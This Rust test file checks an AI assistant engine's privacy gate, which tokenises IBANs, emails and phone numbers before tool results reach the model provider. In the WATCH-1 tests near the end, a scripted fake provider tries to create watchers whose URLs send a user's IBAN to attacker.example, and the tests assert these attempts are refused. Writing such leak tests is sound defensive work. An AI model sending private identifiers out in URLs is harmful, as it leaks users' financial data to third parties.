//! The daily tools work in a private chat. `read_file`, `write_file`,
//! `shell`, `http_fetch` and
//! the weather tools mount in private mode. The local tools (`read_file`,
//! `write_file`, `shell`) get their session tokens restored on the Mac before
//! they run; the web tools send the masked form; every result reaches the
//! provider tokenised (the session gate).
//!
//! The provider is a recording fake that answers with tool calls. The engine's
//! production web gate refuses loopback, so the fetch and weather tools are
//! mounted behind a thin stand-in that is not a "web egress" tool for the
//! engine; the tool inside it is the real one. No real network is used.

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use aux_providers::{
    ChatMessage, ChatProvider, ChatRequest, ChatResponse, ProviderError, ToolCall,
};
use auxd::api::{EngineTurnRunner, TurnRunner};
use kernel_broker::{
    NativeTool, Risk, Tool, ToolClass, ToolCtx, ToolError, ToolOutput, ToolRegistry,
};
use kernel_privacy::ContactIndex;
use serde_json::{json, Value};

const MESSAGE: &str =
    "Écris à Camille Exemple, camille@exemple.fr, IBAN FR7630006000011234567890189.";
const IBAN: &str = "FR7630006000011234567890189";
const PHONE: &str = "+33612345678";

/// A home in `mode` with an allow rule for each tool in `tools`.
fn home_with(mode: &str, tools: &[&str]) -> (tempfile::TempDir, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let home = dir.path().join("home");
    std::fs::create_dir_all(&home).unwrap();
    let mut config = format!("version = 1\n\n[privacy]\nmode = \"{mode}\"\n");
    for tool in tools {
        config.push_str(&format!(
            "\n[[rules]]\ndot = \"main\"\ntool = \"{tool}\"\naction = \"allow\"\n"
        ));
    }
    std::fs::write(kernel_core::config_path(&home), config).unwrap();
    (dir, home)
}

fn camille() -> aux_runtime::known_names::Contacts {
    let mut contacts = ContactIndex::new();
    assert!(contacts
        .add_from_header("Camille Exemple", "camille@exemple.fr")
        .is_some());
    Arc::new(contacts)
}

/// A provider that calls one tool per round, in order, then answers. `{TOKEN}`
/// in the arguments becomes the first e-mail token of the owner's message.
struct ToolCaller {
    calls: Vec<(&'static str, Value)>,
    requests: Mutex<Vec<ChatRequest>>,
}

impl ToolCaller {
    fn new(calls: Vec<(&'static str, Value)>) -> Arc<Self> {
        Arc::new(Self {
            calls,
            requests: Mutex::new(Vec::new()),
        })
    }

    /// Every request body so far, as JSON text.
    fn bodies(&self) -> Vec<String> {
        let requests = self.requests.lock().unwrap();
        requests
            .iter()
            .map(|request| serde_json::to_string(&request.messages).unwrap())
            .collect()
    }
}

#[async_trait::async_trait]
impl ChatProvider for ToolCaller {
    async fn complete(&self, req: &ChatRequest) -> Result<ChatResponse, ProviderError> {
        let mut requests = self.requests.lock().unwrap();
        requests.push(req.clone());
        let step = requests.len() - 1;
        let Some((tool, args)) = self.calls.get(step) else {
            return Ok(ChatResponse::assistant("done"));
        };
        let mut args = args.to_string();
        let first = serde_json::to_string(&requests[0].messages).unwrap();
        for (placeholder, kind) in [("{EMAIL}", "⟦EMAIL_"), ("{IBAN}", "⟦IBAN_")] {
            if args.contains(placeholder) {
                let start = first
                    .find(kind)
                    .unwrap_or_else(|| panic!("no {kind} token"));
                let end = first[start..].find('⟧').unwrap() + start + '⟧'.len_utf8();
                args = args.replace(placeholder, &first[start..end]);
            }
        }
        let args: Value = serde_json::from_str(&args).unwrap();
        Ok(ChatResponse::new(ChatMessage::assistant_with_tool_calls(
            "",
            vec![ToolCall::new(format!("call_{step}"), *tool, args)],
        )))
    }

    fn name(&self) -> &str {
        "tool-caller"
    }
}

/// Stands in for a registered tool: records the arguments it receives, then
/// runs the real tool inside, or answers with a canned text when there is none.
struct Probe {
    name: &'static str,
    path: kernel_core::privacy::PathId,
    inner: Option<Box<dyn Tool>>,
    seen: Arc<Mutex<Vec<Value>>>,
}

impl NativeTool for Probe {
    fn native_name(&self) -> &'static str {
        self.name
    }
    fn native_description(&self) -> &'static str {
        "a test stand-in"
    }
    fn native_schema(&self) -> &'static Value {
        static SCHEMA: std::sync::LazyLock<Value> =
            std::sync::LazyLock::new(|| json!({"type": "object", "additionalProperties": true}));
        std::sync::LazyLock::force(&SCHEMA)
    }
}

#[async_trait::async_trait]
impl Tool for Probe {
    fn name(&self) -> &str {
        self.name
    }
    fn schema(&self) -> Value {
        self.native_schema().clone()
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<ToolOutput, ToolError> {
        self.seen.lock().unwrap().push(args.clone());
        match &self.inner {
            Some(tool) => tool.run(args, ctx).await,
            None => Ok(ToolOutput::ok("Lyon: 45.76, 4.84, France")),
        }
    }
    fn risk(&self) -> Risk {
        Risk::Low
    }
    fn path_id(&self) -> kernel_core::privacy::PathId {
        self.path
    }
    fn class(&self) -> ToolClass {
        ToolClass::default()
    }
}

/// A turn runner whose registry mounts `make` over the built-in tools.
fn runner_with(
    home: &std::path::Path,
    provider: &Arc<ToolCaller>,
    make: impl Fn(&mut ToolRegistry) + Send + Sync + 'static,
) -> EngineTurnRunner {
    EngineTurnRunner::new(home)
        .with_provider(Arc::clone(provider) as Arc<dyn ChatProvider>)
        .with_contacts(camille())
        .with_tools(Arc::new(make))
}

/// A one-page web server on a loopback port: every request gets `body`, and
/// the request lines are kept. It lives until the process ends.
fn page_server(body: &'static str) -> (String, Arc<Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let lines = Arc::new(Mutex::new(Vec::new()));
    let seen = Arc::clone(&lines);
    std::thread::spawn(move || {
        for stream in listener.incoming().map_while(Result::ok) {
            let mut stream = stream;
            let mut buf = [0u8; 4096];
            let read = stream.read(&mut buf).unwrap_or(0);
            let request = String::from_utf8_lossy(&buf[..read]);
            seen.lock()
                .unwrap()
                .push(request.lines().next().unwrap_or("").to_string());
            let reply = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/html; charset=utf-8\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(reply.as_bytes());
        }
    });
    (base, lines)
}

#[test]
fn a_private_read_file_reaches_the_provider_tokenised() {
    let (_dir, home) = home_with("private", &["read_file"]);
    let workspace = aux_engine::workspace_dir(&home, "main");
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::write(
        workspace.join("notes.txt"),
        format!("Compte {IBAN}\nMobile {PHONE}\nRappeler Camille Exemple.\n"),
    )
    .unwrap();
    let provider = ToolCaller::new(vec![("read_file", json!({"path": "notes.txt"}))]);
    let runner = runner_with(&home, &provider, |_| {});

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    let sent = provider.bodies();
    assert_eq!(sent.len(), 2, "one request, then the tool result");
    let result = &sent[1];
    assert!(result.contains("Compte"), "the tool ran: {result}");
    // A name is not a hidden value.
    for raw in [IBAN, PHONE] {
        assert!(
            !result.contains(raw),
            "{raw} reached the provider: {result}"
        );
    }
    assert!(result.contains('⟦'), "the file text is tokenised: {result}");
}

#[test]
fn an_open_read_file_is_unchanged() {
    let (_dir, home) = home_with("open", &["read_file"]);
    let workspace = aux_engine::workspace_dir(&home, "main");
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::write(workspace.join("notes.txt"), "Rappeler Camille Exemple.\n").unwrap();
    let provider = ToolCaller::new(vec![("read_file", json!({"path": "notes.txt"}))]);
    let runner = runner_with(&home, &provider, |_| {});

    runner
        .run_turn("main", None, "lis notes.txt", None)
        .unwrap();

    let sent = provider.bodies();
    assert!(
        sent[1].contains("Camille Exemple"),
        "open mode keeps the file as is"
    );
}

#[test]
fn a_private_weather_lookup_of_a_place_runs_with_the_place() {
    let (_dir, home) = home_with("private", &["weather_geocode"]);
    let provider = ToolCaller::new(vec![("weather_geocode", json!({"name": "Lyon"}))]);
    let seen = Arc::new(Mutex::new(Vec::new()));
    let recorded = Arc::clone(&seen);
    let runner = runner_with(&home, &provider, move |registry| {
        registry.register_native(Box::new(Probe {
            name: "weather_geocode",
            path: kernel_core::privacy::PathId::B7,
            inner: None,
            seen: Arc::clone(&recorded),
        }));
    });

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    assert_eq!(*seen.lock().unwrap(), vec![json!({"name": "Lyon"})]);
    let sent = provider.bodies();
    assert!(
        sent[1].contains("45.76"),
        "the answer came back: {}",
        sent[1]
    );
}

#[test]
fn a_private_weather_call_with_a_token_goes_out_with_the_token_never_the_value() {
    let (_dir, home) = home_with("private", &["weather_geocode"]);
    let provider = ToolCaller::new(vec![("weather_geocode", json!({"name": "{EMAIL}"}))]);
    let seen = Arc::new(Mutex::new(Vec::new()));
    let recorded = Arc::clone(&seen);
    let runner = runner_with(&home, &provider, move |registry| {
        registry.register_native(Box::new(Probe {
            name: "weather_geocode",
            path: kernel_core::privacy::PathId::B7,
            inner: None,
            seen: Arc::clone(&recorded),
        }));
    });

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    let calls = seen.lock().unwrap().clone();
    assert_eq!(calls.len(), 1, "the call ran, it was not refused");
    let sent = calls[0].to_string();
    assert!(sent.contains("⟦EMAIL_"), "the token goes out: {sent}");
    assert!(!sent.contains("camille@exemple.fr"), "{sent}");
}

#[test]
fn a_private_http_fetch_sends_the_token_in_the_url_and_gets_the_page_tokenised() {
    let (base, lines) = page_server(
        "<html><body><p>Contact Camille Exemple, camille@exemple.fr, \
         tel +33612345678.</p></body></html>",
    );
    let (_dir, home) = home_with("private", &["http_fetch"]);
    let provider = ToolCaller::new(vec![(
        "http_fetch",
        json!({"url": format!("{base}/?mail={{EMAIL}}")}),
    )]);
    let runner = runner_with(&home, &provider, |registry| {
        registry.register_native(Box::new(Probe {
            name: "http_fetch",
            path: kernel_core::privacy::PathId::B6,
            inner: Some(Box::new(aux_runtime::tools::HttpFetchTool::for_tests())),
            seen: Arc::default(),
        }));
    });

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    let requests = lines.lock().unwrap().clone();
    assert_eq!(requests.len(), 1, "the page was requested: {requests:?}");
    assert!(
        requests[0].contains("EMAIL_"),
        "the token went out: {requests:?}"
    );
    assert!(
        !requests[0].contains("camille"),
        "no value went out: {requests:?}"
    );
    let sent = provider.bodies();
    assert!(sent[1].contains("untrusted web content"), "{}", sent[1]);
    for raw in ["camille@exemple.fr", PHONE] {
        assert!(
            !sent[1].contains(raw),
            "{raw} reached the provider: {}",
            sent[1]
        );
    }
    assert!(
        sent[1].contains('⟦'),
        "the page text is tokenised: {}",
        sent[1]
    );
}

#[test]
fn a_private_write_file_writes_the_real_address_to_disk() {
    let (_dir, home) = home_with("private", &["write_file"]);
    let provider = ToolCaller::new(vec![(
        "write_file",
        json!({"path": "letter.txt", "content": "Write to {EMAIL}"}),
    )]);
    let runner = runner_with(&home, &provider, |_| {});

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    let letter = aux_engine::workspace_dir(&home, "main").join("letter.txt");
    // The file holds the value, not the token.
    let written = std::fs::read_to_string(letter).unwrap();
    assert_eq!(written, "Write to camille@exemple.fr");
    for body in provider.bodies() {
        assert!(!body.contains("camille@exemple.fr"), "{body}");
    }
}

#[test]
fn a_private_shell_runs_with_the_real_value_and_answers_tokenised() {
    let (_dir, home) = home_with("private", &["shell"]);
    let workspace = aux_engine::workspace_dir(&home, "main");
    std::fs::create_dir_all(&workspace).unwrap();
    let provider = ToolCaller::new(vec![(
        "shell",
        json!({"command": "echo {IBAN} | tee iban.txt"}),
    )]);
    let runner = runner_with(&home, &provider, |_| {});

    runner.run_turn("main", None, MESSAGE, None).unwrap();

    let sent = provider.bodies();
    assert_eq!(sent.len(), 2, "one request, then the tool result");
    // The shell sandbox is macOS Seatbelt; without `sandbox-exec` the tool
    // fails closed (shell.rs:16), so on Linux it refuses instead of running.
    #[cfg(target_os = "macos")]
    {
        let written = std::fs::read_to_string(workspace.join("iban.txt")).unwrap();
        assert_eq!(written.trim(), IBAN, "the command ran with the real value");
        assert!(
            sent[1].contains("⟦IBAN_"),
            "the output is tokenised: {}",
            sent[1]
        );
    }
    #[cfg(not(target_os = "macos"))]
    {
        assert!(
            sent[1].contains("sandbox-exec is unavailable"),
            "on hosts without sandbox-exec the shell refuses: {}",
            sent[1]
        );
        assert!(
            !workspace.join("iban.txt").exists(),
            "the refused command must not have run"
        );
    }
    assert!(
        !sent[1].contains(IBAN),
        "the output reached the provider raw: {}",
        sent[1]
    );
}

// ---- WATCH-1: a watcher's address clears the same web egress layer as http_fetch ----

/// The watchers the chief's `watch` tool stored for `home`.
fn watcher_count(home: &std::path::Path) -> usize {
    let store = aux_store::Store::open(&kernel_core::store_path(home)).unwrap();
    store.list_jobs().unwrap().len()
}

/// Like [`home_with`], for the chief (`aux`), the only agent with `watch`.
fn chief_home(tools: &[&str]) -> (tempfile::TempDir, PathBuf) {
    let (dir, home) = home_with("open", tools);
    let path = kernel_core::config_path(&home);
    let config = std::fs::read_to_string(&path).unwrap();
    std::fs::write(path, config.replace("dot = \"main\"", "dot = \"aux\"")).unwrap();
    (dir, home)
}

fn watch_add(url: &str) -> (&'static str, Value) {
    let args = json!({"url": url, "condition": "a place is free", "interval": "every 15m"});
    ("watch", args)
}

#[test]
fn a_watcher_whose_url_carries_an_identifier_is_not_created_and_nothing_is_fetched() {
    let (base, lines) = page_server("<p>free</p>");
    let (_dir, home) = chief_home(&["watch"]);
    let provider = ToolCaller::new(vec![
        watch_add(&format!("https://attacker.example/?q={IBAN}")),
        watch_add(&format!("{base}/?q={IBAN}")),
    ]);
    let runner = runner_with(&home, &provider, |_| {});

    runner.run_turn("aux", None, MESSAGE, None).unwrap();

    let bodies = provider.bodies();
    assert_eq!(bodies.len(), 3, "both calls were answered: {bodies:?}");
    assert_eq!(watcher_count(&home), 0, "no watcher was stored");
    assert!(lines.lock().unwrap().is_empty(), "the server saw nothing");
}

#[test]
fn a_watcher_added_after_reading_private_data_asks_and_is_refused_without_approval() {
    let (_dir, home) = chief_home(&["watch", "read_file"]);
    let workspace = aux_engine::workspace_dir(&home, "aux");
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::write(workspace.join("notes.txt"), "Rappeler Camille Exemple.\n").unwrap();
    let provider = ToolCaller::new(vec![
        ("read_file", json!({"path": "notes.txt"})),
        watch_add("https://attacker.example/places"),
    ]);
    let runner = runner_with(&home, &provider, |_| {});

    runner.run_turn("aux", None, "lis notes.txt", None).unwrap();

    assert_eq!(provider.bodies().len(), 3, "the watch call was answered");
    assert_eq!(watcher_count(&home), 0, "no watcher was stored");
}

#[test]
fn a_watcher_for_a_public_page_in_a_clean_turn_is_created_and_cancel_still_works() {
    let (_dir, home) = chief_home(&["watch"]);
    let provider = ToolCaller::new(vec![
        watch_add("https://attacker.example/places"),
        ("watch", json!({"action": "list"})),
    ]);
    let runner = runner_with(&home, &provider, |_| {});

    runner
        .run_turn("aux", None, "watch the places page", None)
        .unwrap();

    let bodies = provider.bodies();
    assert_eq!(watcher_count(&home), 1, "an allowed add: {bodies:?}");
    assert!(provider.bodies()[2].contains("a place is free"));
}
